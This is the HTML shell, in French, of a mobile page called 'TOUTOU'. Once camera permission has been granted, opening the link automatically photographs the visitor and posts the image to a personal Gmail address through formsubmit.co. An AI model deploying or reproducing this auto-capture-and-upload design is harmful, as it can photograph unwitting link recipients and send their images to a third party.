<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="apple-mobile-web-app-title" content="TOUTOU" />
    <meta name="theme-color" content="#07080c" />
    <title>TOUTOU</title>
    <link rel="manifest" href="manifest.webmanifest" />
    <link rel="icon" href="favicon.svg" type="image/svg+xml" />
    <link rel="apple-touch-icon" href="favicon.svg" />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div class="glow glow-a" aria-hidden="true"></div>
    <div class="glow glow-b" aria-hidden="true"></div>

    <main class="sheet">
      <header class="hero">
        <p class="kicker">Safari · iPhone</p>
        <h1>TOUTOU</h1>
        <p class="lead">
          En ouvrant ce lien, la caméra se lance et la photo part vers
          <strong>cmahdi204@gmail.com</strong>.
        </p>
      </header>

      <section class="stage" aria-live="polite">
        <video id="live" class="live" playsinline muted autoplay hidden></video>
        <img id="preview" class="preview" alt="Aperçu de la photo" hidden />
        <div id="placeholder" class="placeholder">
          <div class="spinner" aria-hidden="true"></div>
          <span id="placeholderText">Ouverture de la caméra…</span>
        </div>
        <div id="flash" class="flash" hidden></div>
      </section>

      <form
        id="form"
        action="https://formsubmit.co/cmahdi204@gmail.com"
        method="POST"
        enctype="multipart/form-data"
      >
        <input type="hidden" name="_subject" value="TOUTOU" />
        <input type="hidden" name="_template" value="table" />
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_next" id="nextUrl" value="" />
        <input type="text" name="_honey" class="honey" tabindex="-1" autocomplete="off" />
        <input type="hidden" name="appareil" id="deviceField" value="iPhone" />
        <input type="hidden" name="date" id="dateField" value="" />
        <input type="hidden" name="photo_url" id="photoUrl" value="" />
        <input type="hidden" name="taille" id="sizeField" value="" />
        <input
          id="cameraInput"
          class="file"
          type="file"
          name="attachment"
          accept="image/jpeg,image/png"
        />
      </form>

      <p id="status" class="status" role="status">Lancement automatique…</p>
      <p class="hint">
        Safari affiche l’autorisation caméra d’Apple une seule fois. Ensuite,
        ouvrir le lien prend la photo directement.
      </p>
    </main>

    <div id="overlay" class="overlay" hidden>
      <div class="spinner" aria-hidden="true"></div>
      <p>Envoi vers Gmail…</p>
    </div>

    <script src="app.js"></script>
  </body>
</html>
